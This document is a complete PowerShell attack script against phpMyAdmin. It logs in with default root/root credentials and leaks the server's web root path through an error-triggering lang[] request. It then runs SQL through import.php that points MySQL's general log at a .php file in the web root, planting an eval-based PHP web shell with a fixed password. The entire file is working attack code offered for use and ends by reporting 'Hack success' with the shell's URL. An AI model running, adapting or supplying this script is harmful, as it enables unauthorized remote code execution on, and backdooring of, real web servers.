param(
    [string]$WebRoot = "",
    [string]$Uri = "",
    [string]$Username = "root",
    [string]$Password = "root",
    [string]$Proxy = "",
    [string]$Payload = "",
    [string]$ShellName = "",
    [string]$ShellPasswd = ""
)

$USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36";

function login{
    param (
        [string]$Uri = "",
        [string]$Username = "root",
        [string]$Password = "root",
        [string]$Proxy = ""
    )
    if ( -not $USER_AGENT ) {
        $USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36";
    }
    # set_session=v1tp3kfillj1045emu058opeqp&pma_username=root&pma_password=root&server=1&target=index.php&token=467a30757a707850584729714676756c
    $_token = "";
    $_session = "";
    $_target = "";
    $_server = "";
    
    if ( -not ( $Uri -like "*.php" )) {
        if ($Uri -notlike "*/" ) {
            $Uri = $Uri + "/";
        }
        $Uri = "$($Uri)index.php";
    }
    if ($Proxy -ne "") {
        $response = ( curl -Uri $Uri -Proxy $Proxy -SessionVariable '_cookie' -UserAgent $USER_AGENT);
    } else {
        $response = ( curl -Uri $Uri -SessionVariable '_cookie' -UserAgent $USER_AGENT);
    }

    if ($response.StatusCode -ne 200) {
        return @{ code = $response.StatusCode; msg = "fail" };
    }

    if ($response.InputFields -eq $Null) {
        return @{ code = 0 ; msg = "fail"};
    }

    $_token = ( $response.InputFields | Where-Object { $_.outerHTML -like "*token*" } )[0].value;
    $_session = ( $response.InputFields | Where-Object { $_.outerHTML -like "*session*" } )[0].value;
    $_target = ( $response.InputFields | Where-Object { $_.outerHTML -like "*target*" } )[0].value;
    $_server = ( $response.InputFields | Where-Object { $_.outerHTML -like "*server*" } )[0].value;

    if (($_token -eq "") -or ($_session -eq "") -or ($_target -eq "") -or ($_server -eq "")) {
        return @{ code = 0; msg = "fail"};
    }

    if ($Proxy -ne "") {
        $response = ( curl -Uri $Uri -Method Post -Proxy $Proxy -UserAgent $USER_AGENT -Body "set_session=$($_session)&pma_username=$($Username)&pma_password=$($Password)&server=$($_server)&target=$($_target)&token=$($_token)" -WebSession $_cookie );
    } else {
        $response = ( curl -Uri $Uri -Method Post -UserAgent $USER_AGENT -Body "set_session=$($_session)&pma_username=$($Username)&pma_password=$($Password)&server=$($_server)&target=$($_target)&token=$($_token)" -WebSession $_cookie );
    }
    if ($response.StatusCode -ne 200 ) {
        return @{ code = $response.StatusCode; msg = "fail" };
    }

    if ($response.InputFields -eq $Null) {
        return @{ code = 0 ; msg = "fail";};
    }
    
    return @{
        code = $response.StatusCode;
        webSession = $_cookie;
        response = $response;
        token = ((( $response.InputFields | Where-Object {$_.name -eq "token" } )[0]).value) ;
        msg = "success";
    };
}

function hack{
    param (
        [string]$UrlWithoutFile = "",
        [string]$Token = "",
        [string]$Payload = "",
        [string]$Proxy = "",
        [string]$WebRoot = "",
        $WebSession = $Null,
        [string]$ShellName = "",
        [string]$ShellPasswd = ""
    )

    Add-Type -AssemblyName System.Web;

    if(($UrlWithoutFile -eq "") -or ($Token -eq "") -or ($WebSession -eq $Null)) {
        return @{
            code = 0
        }
    }

    if (-not $USER_AGENT) {
        $USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36";
    }

    if ($WebRoot -notlike "*/" ) {
        $WebRoot = $WebRoot + "/";
    }

    if ($UrlWithoutFile -notlike "*/" ) {
        $UrlWithoutFile = $UrlWithoutFile + "/";
    }

    if ($ShellName -eq "") {
        $ShellName = "ant";
    }
    if ($ShellPasswd -eq "") {
        $ShellPasswd = "jzy";
    }

    if ($Payload -eq "") {
        $Payload = [System.Web.HttpUtility]::UrlEncode("'<?php @eval(`$_POST[`"$($ShellPasswd)`"]);?>'");
    }


    $_shellPath = [System.Web.HttpUtility]::UrlEncode($WebRoot + "$($ShellName).php");

    $_body = "is_js_confirmed=0&token=$($Token)&pos=0&goto=server_sql.php&
            message_to_show=%E6%82%A8%E5%A6%88%E7%9A%84+SQL+%E8%AF%AD%E5%8F%A5%E5%B7%B2%E6%88%90%E5%8A%9F%E8%BF%90%E8%A1%8C%E3%80%82&`
            prev_sql_query=&sql_query=
                SET+GLOBAL+general_log+%3D+%22ON%22%3B%0D%0A
                SET+GLOBAL+general_log_file%3D'$($_shellPath)'%3B%0D%0A
                SELECT+$($Payload)%3B%0D%0A
                SET+GLOBAL+general_log+%3D+%22OFF%22%3B%0D%0A
                SET+GLOBAL+general_log_file%3D'log'%3B%0D%0A&sql_delimiter=%3B&fk_checks=0&fk_checks=1&SQL=%E6%89%A7%E8%A1%8C&ajax_request=true&ajax_page_request=true&_nocache=1625554744825410229&token=$($Token)";
    
    $_header = @{
        "Accept"="*/*"
          "X-Requested-With"="XMLHttpRequest"
          "User-Agent"="$($USER_AGENT)"
          "Accept-Encoding"="gzip, deflate"
          "Accept-Language"="zh-CN,zh;q=0.9"
        };
    if ($Proxy -ne "") {
        $response = ( Invoke-WebRequest -Uri "$($UrlWithoutFile)import.php" `
            -Method "POST" `
            -WebSession $WebSession `
            -Proxy $Proxy `
            -Headers  $_header `
            -ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
            -Body $_body
        );
     } else {
        $response = ( Invoke-WebRequest -Uri "$($UrlWithoutFile)import.php" `
            -Method "POST" `
            -WebSession $WebSession `
            -Headers  $_header `
            -ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
            -Body $_body
        );
     }

    if ($response.StatusCode -ne 200 ) {
        return @{ code = $response.StatusCode };
    }
    $json = ($response.Content | ConvertFrom-Json );
    if (-not $json.success) {
        return @{
            code = -1;
            webSession = $WebSession;
            token = $Token;
            response = $response;
            msg = $json.error;
        }
    }

    return @{
        code = $response.StatusCode;
        webSession = $WebSession;
        response = $response;
        token = $Token;
        msg = "success";
    }
}

function getWebRoot{
    param (
        [string]$Uri = "",
        [string]$Proxy = ""
    )
    $pattern = '([\\/\w:]+[/\\])libraries[/\\]classes[\\/]LanguageManager\.php'

    if ($Uri -like "*.php") {
        $Uri = ( $Uri -replace "/.*\.php","" );
    }
    if ($Proxy -ne "") {
        $response = ( Invoke-WebRequest -Uri "$($Uri)/index.php?lang[]=1" -Proxy $Proxy );
    } else {
        $response = ( Invoke-WebRequest -Uri "$($Uri)/index.php?lang[]=1");
    }

    if ( ($response.StatusCode -eq 200) -and ($response.Content -match 'Fatal error' )) {
        echo "Response:"$response.content
        if ($response.Content -match $pattern ) {
            echo "Tht webroot might be: "$Matches[1];
        }
    }

}

if ($WebRoot -eq "") {
    getWebRoot -Uri $Uri -Proxy $Proxy ;
    $WebRoot = (Read-Host -Prompt "Please input the path for the root of PhpMyAdmin");
}

$WebRoot = ($WebRoot -replace "\\","/");

if ($Uri -eq "") {
    $Uri = (Read-Host -Prompt "Please input the url for PhpMyAdmin");
}
    if ($ShellName -eq "") {
        $ShellName = "ant";
    }

    if ($ShellPasswd -eq "") {
        $ShellPasswd = "jzy";
    }

$res = (login -Uri $Uri -Username $Username -Password $Password -Proxy $Proxy);

if ($res.code -ne 200) {
    echo $res.msg;
    exit $res.code;
}

Write-Host "Login success, please waiting for 3 seconds";
Sleep 2;

if ($Uri -like "*.php") {
    $Uri = ( $Uri -replace "/index\.php","" );
}

$res = (hack -UrlWithoutFile $Uri -Token $res.token -Payload $Payload -Proxy $Proxy -WebRoot $WebRoot -WebSession $res.webSession);

if ($res.code -ne 200) {
    echo $res.msg;
    exit $res.code;
}

    if ($Uri -notlike "*/" ) {
        $Uri = $Uri + "/";
    }

Write-Host "Hack success! The url for you is $($Uri)$($ShellName).php, password is $($ShellPasswd) ";
